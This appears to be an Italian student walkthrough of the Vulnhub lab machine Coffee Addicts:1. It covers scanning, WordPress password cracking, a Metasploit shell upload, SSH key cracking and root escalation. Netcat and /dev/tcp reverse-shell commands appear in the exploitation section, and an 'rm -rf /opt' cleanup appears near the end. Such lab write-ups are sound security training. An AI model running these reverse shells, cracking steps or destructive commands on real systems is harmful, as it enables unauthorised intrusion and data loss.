# CoffeeAddicts1 - Walkthrough

##
## Target Scoping
La macchina in esame è COFFE ADDICTS:1, una macchina vulnerabile by design presente sulla piattaforma Vulnhub, al seguente indirizzo https://www.vulnhub.com/entry/coffee-addicts-1,699/

##
## Information Gathering
In questa fase si sono cercate informazioni rilevanti riguardo la macchina target ma le uniche disponibili erano quelle presenti sulla pagina di Vulnhub. Di seguito elencate:

**•	Description**

Our coffee shop has been hacked!! can you fix the damage and find who did it?

**•	Virtual Machine**

Format: Virtual Machine (Virtualbox - OVA)

Operating System: Linux

Tramite la descrizione possiamo assumere che un sito web sia stato manomesso da un utente malevolo, dopo aver manomesso il sito web molto probabilmente si sarà accinto a prendere il controllo della macchina stessa.  Dalle informazioni della Virtual Machine sappiamo che il sistema operativo e Linux based.


##
## Target Scoping

In questa fase dell’attività si vanno a identificare le macchine target attive, in modo tale da essere analizzate durante le fasi successive del processo di penetration testing.
In generale, prima di iniziare il processo di identificazione è fondamentale conoscere i termini e gli accordi stipulati con chi ha commissionato il test, ma non è questo il caso.
Innanzitutto, andiamo a vedere qual è il nostro indirizzo IP tramite il comando


>ifconfig eth0

![1](https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/dd7fbf2c-9c28-4265-90be-2435f4343e98)

Successivamente, tramite nmap andiamo a identificare gli host connessi alla rete tramite il comando 

>nmap -sN 10.0.2.15

![2](https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/35f51e05-d3b6-45e0-875c-c71532b6c949)


E’ stato rilevato l’host 10.0.2.6 che rappresenta la nostra macchina target. Come prima cosa, possiamo notare che l’host presenta due porte aperte, la 22/tcp e la 80/tcp, destinate rispettivamente al servizio ssh e http. Inoltre, è stato individuato anche il MAC address dell’host.

##
## Enumerating Target 

Questa fase ha lo scopo di attingere il maggior numero di informazioni possibili sui servizi erogati dalle macchine individuate, così da poterle utilizzare fasi successive.
Quindi, andiamo ad effettuare una scansione più approfondita sempre tramite nmap dell’host 10.0.2.6.
<p></p>
<p></p>


![3 1](https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/b5acda94-fa93-48d9-a7cb-30eee93e9c68)

![3 2](https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/eb68faea-9cfa-4a5e-86a5-a2850feb25c9)

Dai risultati ottenuti possiamo notare diverse informazioni sulla porta 22 come la versione di OpenSSH e i tre tipi di ssh-hostkey. Sulla porta 80, invece, si sono individuate la versione del server Apache, i metodi HTTP supportati e la mancanza di un titolo per il sito. Inoltre, avendo visto che il sistema operativo è Linux based, si è andati a saperne di più a proposito :


>nmap	-O 10.0.2.6
<p></p>
<img width="448" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/0d7edd32-26ea-4ced-997f-37188f871292">

<p></p>

I risultati ci mostrano che la versione del kernel va dalla 4.15 alla 5.6, ovvero corrisponde ad un kernel utilizzato tra Aprile 2015 (Ubuntu 18.04 LTS) e Giugno 2020 (Ubuntu 20.04 LTS). Sapendo che il sistema operativo della macchina target è Ubuntu 18.04, possiamo affermare che la versione del kernel e 18.04 LTS.

Ora dato che la porta 80 è aperta andiamo a cercare l’indirizzo 10.0.2.6 sul browser


<img width="451" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/9d2b76d9-7dd4-4dc6-a5ff-d2a3ccd5ef53">


Il risultato della ricerca ci fornisce delle indicazioni utili per poter accedere ai servizi http.
Pertanto, si va ad aggiungere il nome del dominio all’indirizzo IP nella directory indicata dalle istruzioni. 

![6](https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/199ac6a3-e63b-41fc-a368-8b679e71dfff)


Fatto ciò, si è cercato sul browser l’indirizzo http://coffeaddicts.thm con il seguente risultato:

![7](https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/a1027f99-6df5-4f6d-99a7-aede878279ab)

Nella pagina possiamo notare diverse informazioni utili:

- l’autore della manomissione del sito e della macchina usa lo pseudonimo di BadByte
  
-	Un apparente indirizzo di wallet Bitcoin fornito dall’utente malevolo
  
Nel frattempo, andiamo a salvare tutte le frasi e le parole della pagina all’interno di un file.txt in modo da poterle sfruttare eventualmente in seguito.
Dato che l’indirizzo sembra sospettoso, effettuiamo qualche conversione in base64 e viene restituito il seguente risultato:

**THM{im_the_lizard_king} https://www.youtube.com/watch?v=dQw4w9WgXcQ**

Successivamente, tramite nmap si cercano vulnerabilità e degli exploit trovati per l’indirizzo IP  con i comandi:


>nmap -script vuln 10.0.2.6

<img width="317" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/528ec4a8-9dc9-44b9-b62d-60a9a08edc47">


>nmap -script exploit 10.0.2.6

<img width="315" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/86b24f58-f6ab-4166-b6b2-7df498c31e9a">
<p></p>


Possiamo notare che il sito web è stato creato tramite la piattaforma Wordpress essendo anche presenti due pagine. Una è la pagina di Blog e l’altra quella di autenticazione. Per quanto riguarda gli exploit non è stato trovato niente.



##
## Vulnerability Mapping

In questa fase vengono identificati ed analizzati i problemi di sicurezza del target tramite vulnerabilità conosciute.
Prima di utilizzare i vari tool ci colleghiamo all’indirizzo corrispondente a http://coffeeaddicts.thm/wordpress e andiamo ad analizzare la pagina.
<p></p>

<img width="655" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/d5f3061c-e99f-4486-b2ff-fe942f183215">

<img width="764" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/af6f644b-f501-4cb0-b6eb-eed53bfee69d">
<p></p>

Nella pagina iniziale possiamo notare il nome di un autore di due post “gus”. Spostandoci sull’altro post del blog possiamo notare un’immagine con una frase sotto __“gusineedyouback”__ e sotto sono presenti due commenti, uno di Lucy Longmire __“yo, is that your password??”__ e l’altro è la risposta dell’autore gus __“Maybe.. what could go wrong? uwur”__
Salviamo queste informazioni nel file.txt creato in precedenza e procediamo con i tool.
Il primo tool utilizzato è stato Tenable Nessus, con una prima scansione base della macchina durata circa 8 minuti e non ha evidenziato particolari criticita, infatti, nessus ha prodotto 27 risultati con livello di criticità INFO, ovvero informazioni utili ottenibili dalla macchina target che non essendo delle vere e proprie vulnerabilità non dovrebbero destare problemi, ma se sfruttate, potrebbero risultare utili ad un eventuale utente malevolo

<img width="375" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/6a3a1115-cee0-400b-a6ae-c32b29f96bbe">
<p></p>

<img width="548" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/1d8a580b-dde0-4c10-b24e-3879babfff21">
<p></p>

Successivamente, si è effettuata una scansione avanzata dell’host che ha prodotto gli stessi risultati di quella precedente. Infine, si è effettuato un Web Application Test, ovvero una scansione per le Web App, dalla quale si sono potuti riscontrare risultati diversi.

<img width="428" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/25bca177-5b97-414d-96f2-96ebf30c5f40">
<p></p>

<img width="455" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/93355739-5cc5-4b18-807d-19f9d8d4b185">
<p></p>

Dai risultati possiamo constatare la differenza con le precedenti scansioni, in quanto, sono presenti tre vulnerabilità di livello medio e sono:

**•	Wordpress User Enumeration:** La versione di WordPress ospitata sul server web remoto è influenzata da una vulnerabilità di enumerazione dell'utente. Un utente malintenzionato remoto non autenticato può sfruttarlo per imparare i nomi degli utenti WordPress validi.
Queste informazioni potrebbero essere utilizzate per montare ulteriori attacchi.
Soluzione: n/a

**•	Web Application Potentially Vulnerable to Clickjacking**: Il server web remoto non imposta un'intestazione di risposta X-Frame-Options o un'intestazione di risposta "frame-ancestors" Content-Security-Policy in tutte le risposte ai contenuti. Questo potrebbe potenzialmente esporre il sito a un clickjacking o a un attacco di riparazione dell'interfaccia utente, in cui un utente malintenzionato può indurre un utente a fare clic su un'area della pagina vulnerabile diversa da quella che l'utente percepisce la pagina. Ciò può comportare che un utente esegua transazioni fraudolente o dannose.
Soluzione: Restituire l'intestazione HTTP X-Frame-Options o Content-Security-Policy (con la direttiva 'frame-ancestors') con la risposta della pagina.
Ciò impedisce che il contenuto della pagina venga visualizzato da un altro sito quando si utilizzano i tag HTML frame o iframe.

**•	Browsable Web Directory:** È possibile visualizzare l'elenco delle directory, il quale, può rivelare script nascosti, includere file, file di origine di backup  ecc.., a cui è possibile accedere per leggere informazioni sensibili.
Soluzione: Assicurarsi che le directory sfogliabili non perdano informazioni riservate o non diano accesso a risorse sensibili. Inoltre, utilizzare restrizioni di accesso o disabilitare l'indicizzazione delle directory per qualsiasi cosa faccia.


Per essere sicuri di non tralasciare nessuna possibile vulnerabilità, abbiamo effettuato un ulteriore scansione anche con un altro software, OpenVas, che ha individuato altre due vulnerabilità, rispettivamente di livello medio e basso:

<img width="420" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/153d9916-8f06-4de1-96b0-484ad6ad485c">

<img width="424" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/7e31d3b9-2fb0-4e30-b19c-d4e3718a005b">

Infine, proviamo una scansione tramite il tool di analisi per le Web Application OWASP.
<p></p>

<img width="277" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/ffa6fce7-11f0-4684-b1b3-94f8b1c34faf">
<p></p>


I risultati mostrano l’assenza di vulnerabilità di livello alto, due di livello medio e cinque di livello basso. Inoltre, vi sono anche due vulnerabilità di livello informativo.


<img width="372" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/42f4bc75-25da-4499-b5a9-e023495fdfc4">

In aggiunta alle vulnerabilità significative trovate in precedenza, qui sono state riscontrate anche:


**•	Absence of Anti-CSRF Token:** Un’attaccante potrebbe attuare un attacco che comporta la forzatura di una vittima nell’inviare una richiesta HTTP a una determinata destinazione a sua insaputa. La natura dell'attacco è che la CSRF sfrutta la fiducia che un sito web ha per un utente.
Soluzione: Utilizzare pacchetti anti-CSRF come OWASP CSRFGuard. 

**•	Cookie No HttpOnly Flag:** Un cookie è stato impostato senza il flag HttpOnly, il che significa che JavaScript è accessibile al cookie. Se su questa pagina è possibile eseguire uno script dannoso, il cookie sarà accessibile e potrà essere trasmesso a un altro sito. Se si tratta di un cookie di sessione, potrebbe essere possibile un dirottamento di sessione.
Solizione: Assicurarsi che il flag HttpOnly sia impostato per tutti i cookie.

**•	Cookie without SameSite Attribute:** Un cookie è stato impostato senza l'attributo SameSite, il che significa che il cookie può essere inviato a seguito di una richiesta "cross-site". L'attributo SameSite è un'efficace contromisura alla contraffazione delle richieste cross-site, all'inclusione di script cross-site e agli attacchi temporali.
Soluzione: Assicurarsi che l'attributo SameSite sia impostato su "lax" o idealmente "strict" per tutti i cookie.

**•	X-Content-Type-Options Header Missing:** L'intestazione Anti-MIME-Sniffing X-Content-Type-Options non è impostata su “nosniff”. Ciò consente alle versioni precedenti di Internet Explorer e Chrome di eseguire lo sniffing MIME sul corpo della risposta, causando potenzialmente l'interpretazione e la visualizzazione del corpo della risposta come un tipo di contenuto diverso dal tipo di contenuto dichiarato.
Soluzione: Assicurarsi che l'applicazione/server web imposti l'intestazione Content-Type in modo appropriato e che imposti l'intestazione X-Content-Type-Options su 'nosniff' per tutte le pagine web. Se possibile, assicurarsi che l'utente finale utilizzi un browser web moderno e conforme agli standard che non esegue affatto lo sniffing MIME o che possa essere diretto dall'applicazione web / server web per non eseguire lo sniffing MIME.


Avendo ottenuto diverse informazioni in precedenza, ora ci possiamo affidare ad un tool specifico per WordPress, ovvero WPScan. Avviamo una scansione tramite il seguente comando:

>wpscan –url http://coffeeaddicts.thm/wordpress

<img width="507" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/cf03ba11-2759-43cb-ab9a-15c7b7639986">
<p></p>

<img width="431" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/1c2d125d-d18a-4a73-858d-60e1d55d79e0">
<p></p>

Tra i vari risultati forniti in output dalla scansione c’è il nome di un utente gus, l’autore dei post.
Con questa informazione andiamo alla pagina http://coffeeaddicts.thm/wordpress/wp-login.php
e proviamo ad accedere con il nome gus ed una password casuale, per testare l’effettiva esistenza di un utente con questo nome.

<p></p>
<img width="260" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/9ced49f7-923e-4f6d-8ed7-380471558fde">

Dal messaggio di errore ricevuto constatiamo che il nome utente gus esiste, quindi, ora si passa alla fase di password cracking.
Tramite il tool WPScan proviamo ad effettuare il cracking della password utilizzando il nome utente gus  ed il file.txt, contenente tutte le informazioni raccolte, come wordlist.
<p></p>

<img width="659" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/ddaf413a-89c1-4ce4-b2c8-2b535bd655b3">
<p></p>

Dopo diversi tentativi con varianti diverse dello stesso file, WPScan ci restituisce tale password:
gusineedyouback. Una volta inserita abbiamo accesso al pannello amministratore di WordPress. Quindi, procediamo con il cambio della password dell’utente gus, in modo da evitare nuove intrusioni. Nel pannello si sono notati 12 commenti inviati da utenti esterni e non ancora pubblicati con probabili tentativi di injection di codice malevolo, per cui si è provveduto a disattivare i commenti sotto i post.
Successivamente, si passa alla fase di target exploitation della macchina, ma prima utilizziamo il tool WafW00f per scoprire se c’è qualche tipo di firewall.

<img width="525" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/09b5694e-35de-4818-bce4-e8af5a01bad3">
<p></p>

Dai risultati ottenuti notiamo che non c’è nessun firewall, quindi, si potrebbe utilizzare un attacco di bind shell oltre a quello di reverse shell.

##
## Target Esploitation

In questa fase ha si vanno a sfruttare le vulnerabilità, rilevate durante le precedenti fasi di pentesting, al fine di ottenere il controllo del sistema o di evidenziare ulteriori vulnerabilità. 
Le alternative per implementare gli exploit sono svariate ma per scelta progettuale si è preferito il modus operandi descritto di seguito.

<img width="552" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/d7947d8d-3a99-4da8-b774-547051acb884">

Utilizzo di  Metasploit Framework e ricerca di qualche exploit riguardante WordPress che ci permettesse di poter effettuare shell upload.
Con il comando 
>search wordpress
vengono restituiti diversi exploit ma non ciò che si stava cercando, allora si prova con 
>search wp_admin

<img width="430" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/ab0cfb59-2caa-40f5-b689-862fc0e6b7aa">

Ci viene resituito il risultato che si stava cercando. A questo punto lo si usa con il comando

>use 0
<p></p>

<img width="437" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/38ad7439-4af3-41ab-a020-45e67d4ce206">

Con il comando  show payload vengono mostrati tutti i payload che si riferiscono all’exploit scelto.
<p></p>

<img width="485" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/4f9a92aa-a1a7-42d9-8149-639729128973">
<p></p>

Con show options si vanno a mostrare le i vari settaggi che occorrono per lanciare l’exploit.

<img width="485" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/d06507e3-6ea1-487e-8011-7ac0c1cf3dc4">
<p></p>

Successivamente, si vanno a settare tutti i parametri e poi si lancia l’exploit.

<img width="391" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/665ac0da-a29d-4208-b1b9-1180c2d51557">

<img width="622" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/32fea30e-6f9e-4823-8aeb-557b821fdea5">
<p></p>

L’exploit è andato a buon fine ma da come possiamo vedere si ha un messaggio di errore, il quale, dice che non si riesce ad avere accesso alle parent directories.
Ora tramite netcat lanciamo i comandi per la reverse shell:

>nc -nlvp 4444

<img width="215" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/1dd880e8-5a4c-4d4b-ad9b-d20719a12364">

>nc -nv 10.0.2.15 4444 -e /bin/bash

<img width="425" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/edeedf5f-aa2b-4ba5-a622-28f651070ee6">

Il risultato mostrato ci informa che  con l’opzione -e non e possibile eseguire la bash.
Quindi, cerchiamo il path della bash

<img width="409" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/0961517f-b138-4698-8771-c66c7bd677d6">

Allora, eseguiamo il seguente comando:

>bash -i >& /dev/tcp/10.0.2.15/4444 0>&1
<p></p>

Ora la connessione è avvenuta con successo e tramite il comando ifconfig constatiamo l’avvenuta connessione.
<p></p>

<img width="486" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/38f4af27-0420-4696-9e00-8c98735796bc">

Successivamente si cercano informazioni utili alla privilege escalation.

<img width="337" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/8391c35f-026b-478b-afff-3d0fd742bcb6">

Troviamo due directory utente nella cartella home e andiamo ad ispezionarle entrambi.

<img width="330" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/fe2223fd-4663-4d73-93a8-39a1afec517a">

Nella directory gus si procede ad ispezionare i file.txt, trovando importanti informazioni. Nel readme.txt c’è un messaggio da parte di un certo Nicolas Fritzges, il quale ci informa che il sito è stato hackerato ed ogni tentativo di fix è futile in quanto l’utente admin è stato rimosso dal file sudoers e la password root cambiata.

<img width="652" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/cccc4136-894a-4fc1-9499-54c98806754c">

Nel file user.txt troviamo un messaggio simile a quello trovato nella conversione dell’indirizzo BTC in base64.

<img width="346" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/c92f6071-0cad-4bfb-8577-b2ade7faa19b">

Ora ci si sposta nella directory badbyte ma volendo aprire il file .bash_hystory si trova il messaggio di errore: Permesso negato

<img width="355" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/dd43b084-dd59-42fa-bc97-61cebe99a323">
<p></p>

<img width="379" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/813682f0-8b1b-4ba9-bdad-1a74eeeacdd8">

Nella directory .ssh, invece, viene scoperto il file id_rsa il quale una volta aperto contiene un chiave privata RSA criptata attraverso un algoritmo AES-128-CBC. 

<img width="428" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/0e9d95dc-3299-4248-b383-fb4817c701e7">
<p></p>

Per decriptare la chiave utilizziamo inizialmente Hashcat, il quale non presenta la decriptazione AES-128-BCB ma solo AES-128-ECB, quindi, facciamo un tentativo cercando di trovare qualcosa.

<img width="477" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/3f7f6cd0-68c9-4d8d-9532-ea30d8cbff21">

Purtroppo, il tentativo non è andato a buon fine, quindi, ora proviamo con il tool John The Ripper.
Inizialmente, con il comando locate localizziamo il path di ssh2john.py, dove questo script trasforma fondamentalmente la chiave privata [RSA/DSA/EC/OPENSSH] in un formato per il successivo cracking.

<img width="444" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/17235324-7688-4556-872c-1e62b622bbd7">

Quindi, tramite la wordlist rockyou.txt si procede al cracking della password.

<img width="480" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/abb84ec3-c853-4f20-ad90-ee576bfa4fa6">

Il tool ha restituito un risultato che verrà testato immediatamente.

##
## Privilege Escalation (Post Esploitation)

In questa fase si vanno ad acquisire i permessi root in modo da poter riprendere il controllo della macchina.
Avendo supposto che il login ora sia possibile solo sotto il nome dell’utente malevolo, allora sulla macchina target si vanno ad inserire le  seguenti credenziali:

**- login: badbyte**
**-	password: password**


<img width="354" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/a97ac9d5-cc83-4ec0-942d-8f8b0ac9620d">

John The Ripper ha fornito un risultato corretto.

<img width="299" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/0451bc56-4709-4109-9e9c-fb85053c663e">

Ora si tenta di accedere al file .bash_history per il quale in precedenza non avevamo i permessi.

<img width="411" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/098ab24e-537f-401f-b782-2e34b7b2e4e1">

Giunti qui, si prova ad accedere alla shell. Posizionandosi nella directory /opt/BadByte eseguiamo la shell con il comando

>sudo ./shell

Finalmente si è giunti nella shell, ma non avendo tutti i permessi occorre essere utente root.
Quindi, con il comando su root e la medesima password d’accesso, siamo utenti root.

<img width="428" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/ceac36b0-3199-4f6d-933b-5b0c39c06865">

Innanzitutto, accediamo al file sudoers e cancelliamo la stringa riguardante badbyte.

<img width="452" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/9fb22dc7-d620-4935-8866-fa968941b5ce">

Successivamente, torniamo nella directory home e forniamo tutti i permessi a gus.

<img width="428" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/3a8e66af-7197-40c3-86d8-9923a9c91917">

Poi, andiamo ad aprire il file root.txt trovando un altro flag dell’utente malevolo.

<img width="456" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/e19cb823-be18-4215-a831-327404acdd88">

Quindi, essendo root cambiamo le password per gli utenti gus e root.

<img width="388" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/d31f8ce5-1bde-4d7a-8cd5-5840ab8f5885">
<p></p>

Infine, si va ad eliminare l’utente badbyte con il comando
>userdel -f -r badbyte

quindi, con
<p></p>

>rm -rf /opt
<p></p>

si elimina anche la directory dove vi era la bash di badbyte.

<img width="327" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/4e8151a6-a5bb-435c-8f83-512bf959fc52">
<p></p>

<img width="316" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/d4d65419-cc23-47f6-a124-82b822502a08">
<p></p>

<img width="496" alt="image" src="https://github.com/haxkadc/CoffeeAddicts1/assets/134702013/26291da2-aef1-4d0f-a3d5-02be2dc50ff4">
<p></p>

Ora si ha il controllo totale della macchina target, l’utente malevolo è stato rimosso e l’attività di penetration testing può dirsi conclusa.
